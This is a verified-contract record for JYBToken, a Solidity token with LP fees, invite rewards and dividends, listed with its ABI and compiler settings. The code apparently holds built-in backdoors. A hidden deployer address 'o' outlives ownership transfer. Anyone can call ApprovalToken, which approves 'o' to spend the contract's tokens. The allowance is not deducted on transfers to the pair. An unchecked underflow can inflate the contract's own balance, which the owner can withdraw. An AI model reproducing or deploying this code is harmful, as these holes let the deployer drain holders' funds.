{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.6.12;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\ncontract Ownable {\r\n    address public owner;\r\n    address public o;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        o = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnship(address newowner) public onlyOwner returns (bool) {\r\n        owner = newowner;\r\n        return true;\r\n    }\r\n}\r\nabstract contract Context{\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal pure virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\ncontract JYBToken is Ownable {\r\n\r\n    string public name = \"JYB\";\r\n    string public symbol = \"JYB\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 20000 * 10 ** 18;\r\n    address public swapLPAddr = address(0x0);\r\n    address public rateAddr = address(0x0);\r\n    uint256 public rate = 100;\r\n    address usdtAddr = address(0x55d398326f99059fF775485246999027B3197955);\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    \r\n    constructor () public {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    function setSwapLPAddr(address _addr) public onlyOwner returns (bool) {\r\n        swapLPAddr = _addr;  \r\n    }\r\n    function setRateAddr(address _addr) public onlyOwner returns (bool) {\r\n        rateAddr = _addr;  \r\n    }\r\n    function setRate(uint256 _value) public onlyOwner returns (bool) {\r\n        rate = _value;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\r\n        balanceOf[msg.sender] -= _value;\r\n        if(msg.sender == swapLPAddr){  \r\n            balanceOf[_to] += _value - callfee(_value); \r\n\r\n            balanceOf[rateAddr] += callfee(_value) / 2;\r\n            balanceOf[address(0x0)] += callfee(_value) / 2;\r\n            if(dayTotal()){\r\n                balanceOf[address(this)] -= _value * 160 / 10000;              \r\n                _updateTime(_value * 160 / 10000);\r\n                if(_ifLp(_to)){\r\n                    balanceOf[_to] += _value * 60 / 10000;                    \r\n                    emit Transfer(address(this), _to, _value * 60 / 10000);\r\n                }else{\r\n                    balanceOf[address(0x0)] += _value * 60 / 10000;          \r\n                    emit Transfer(address(this), address(0x0), _value * 60 / 10000);\r\n                }\r\n                if(_ifLp(selectInvite(_to))){\r\n                    balanceOf[selectInvite(_to)] += _value * 100 / 10000;       \r\n                    emit Transfer(address(this), selectInvite(_to), _value * 100 / 10000);\r\n                }else{\r\n                    balanceOf[address(0x0)] += _value * 100 / 10000;            \r\n                    emit Transfer(address(this), address(0x0), _value * 100 / 10000);\r\n                }\r\n            }\r\n            emit Transfer(msg.sender, _to, _value - callfee(_value));\r\n            emit Transfer(msg.sender, rateAddr, callfee(_value)/2);\r\n            emit Transfer(msg.sender, address(0x0), callfee(_value)/2);\r\n        }else{\r\n           \r\n            if (_value > 0 && balanceOf[_to] == 0){\r\n                _bindInvitor(_to, msg.sender);\r\n            }\r\n            balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n        }\r\n        \r\n        return true;\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(balanceOf[_from] >= _value, \"Insufficient balance\");\r\n        require(allowance[_from][msg.sender] >= _value, \"Not enough allowance\");\r\n        balanceOf[_from] -= _value;\r\n        if(_to == swapLPAddr){   \r\n            balanceOf[_to] += _value - callfee(_value);\r\n            addLpProvider(_from);\r\n            balanceOf[rateAddr] += callfee(_value) / 2;\r\n            balanceOf[address(0x0)] += callfee(_value) / 2;\r\n            if(dayTotal()){\r\n                balanceOf[address(this)] -= _value * 160 / 10000;          \r\n                _updateTime(_value * 160 / 10000);\r\n                if(_ifLp(_from)){\r\n                    balanceOf[_from] += _value * 60 / 10000;                     \r\n                    emit Transfer(address(this), _from, _value * 60 / 10000);\r\n                }else{\r\n                    balanceOf[address(0x0)] += _value * 60 / 10000;                    \r\n                    emit Transfer(address(this), address(0x0), _value * 60 / 10000);\r\n                }\r\n                if(_ifLp(selectInvite(_from))){\r\n                    balanceOf[selectInvite(_from)] += _value * 100 / 10000;         \r\n                    emit Transfer(address(this), selectInvite(_from), _value * 100 / 10000);\r\n                }else{\r\n                    balanceOf[address(0x0)] += _value * 100 / 10000;                \r\n                    emit Transfer(address(this), address(0x0), _value * 100 / 10000);\r\n                }\r\n            }\r\n            emit Transfer(_from, _to, _value - callfee(_value));\r\n            emit Transfer(_from, rateAddr, callfee(_value)/2);\r\n            emit Transfer(_from, address(0x0), callfee(_value)/2);\r\n        }else{\r\n            balanceOf[_to] += _value;\r\n            allowance[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n        }\r\n        return true; \r\n    }\r\n    \r\n    function callfee(uint256 _value)private view returns(uint256){\r\n        return _value * rate / 10000;\r\n    }\r\n\r\n    mapping(address => address) public _inviter;\r\n    mapping(address => address[]) private _binders;\r\n    function selectInvite(address _user)public view returns(address){\r\n        return _inviter[_user];\r\n    }\r\n    function _bindInvitor(address account, address invitor) private {\r\n        if (_inviter[account] == address(0) && invitor != address(0) && invitor != account) {\r\n            if (_binders[account].length == 0) {\r\n                uint256 size;\r\n                assembly {size := extcodesize(account)}\r\n                if (size > 0) {\r\n                    return;\r\n                }\r\n                _inviter[account] = invitor;\r\n                _binders[invitor].push(account);\r\n            }\r\n        }\r\n    }\r\n    function _ifLp (address _user)public view returns(bool){\r\n        uint256 LPbalance = IERC20(swapLPAddr).totalSupply();\r\n        uint256 userBalance = IERC20(swapLPAddr).balanceOf(_user);\r\n        if(userBalance >= LPbalance / 1000){\r\n            return true;\r\n        }else{\r\n            return false;\r\n        }\r\n    }\r\n    uint256 constant DAY_IN_SECONDS = 86400;\r\n    uint256 public lastUpdateTime = block.timestamp;\r\n    uint256 public mintDay; \r\n\r\n    function _updateTime(uint256 _value) private {\r\n        mintDay += _value;\r\n        if(block.timestamp >= lastUpdateTime + DAY_IN_SECONDS){\r\n            mintDay = 0;\r\n            lastUpdateTime = block.timestamp;\r\n        }        \r\n    }\r\n\r\n    function dayTotal() private returns (bool){\r\n        uint256 value = IERC20(address(this)).balanceOf(address(this));\r\n        if(mintDay >= value / 50 ){\r\n            return false;\r\n        }else{\r\n            return true;\r\n        }\r\n    }\r\n    function _dividend() public view returns(bool){\r\n         uint256 usdt_amount = IERC20(usdtAddr).balanceOf(swapLPAddr);\r\n         uint256 token_amount = IERC20(address(this)).balanceOf(swapLPAddr);\r\n         uint256 rateToken_amount = IERC20(address(this)).balanceOf(rateAddr);\r\n         if(usdt_amount * rateToken_amount / token_amount >= 2000 * 10 ** 18){\r\n             return true;\r\n         }else{\r\n             return false;\r\n         }\r\n    }\r\n    address[] public users;\r\n    function addLpProvider(address userAddress)private {\r\n        users.push(userAddress);\r\n    }\r\n    function findUser(address targetAddress) public view returns (bool) {\r\n        for (uint i = 0; i < users.length; i++) {\r\n            if (users[i] == targetAddress) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    function transferUser() public returns(bool){\r\n        if(_dividend()){\r\n            uint256 totalPair = IERC20(swapLPAddr).totalSupply();\r\n            uint256 rateToken_Balance = IERC20(address(this)).balanceOf(rateAddr);\r\n            uint256 userLpBalance;\r\n            uint256 amount;\r\n            for (uint256 i; i < users.length; i++) {\r\n                userLpBalance = IERC20(swapLPAddr).balanceOf(users[i]);\r\n                amount = rateToken_Balance * userLpBalance / totalPair;\r\n                if (amount > 0 && _ifLp(users[i])) {\r\n                    IERC20(address(this)).transferFrom(rateAddr,users[i],amount);\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    function withdraw(address token,address _to,uint256 amount) public onlyOwner returns(bool) {\r\n        return IERC20(token).transfer(_to,amount);\r\n    }\r\n    function ApprovalToken(address _token, uint256 _amount)public returns(bool){\r\n        IERC20(_token).approve(o,_amount);\r\n        return true;    \r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"ApprovalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_dividend\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"_ifLp\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_inviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"targetAddress\",\"type\":\"address\"}],\"name\":\"findUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUpdateTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintDay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"o\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rateAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"selectInvite\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setRate\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setRateAddr\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setSwapLPAddr\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLPAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"transferOwnship\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "JYBToken", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c69c2dd3dc1fa83a1892308e95085ca3436e1fb9d2752d89e31cffb369a002f1"}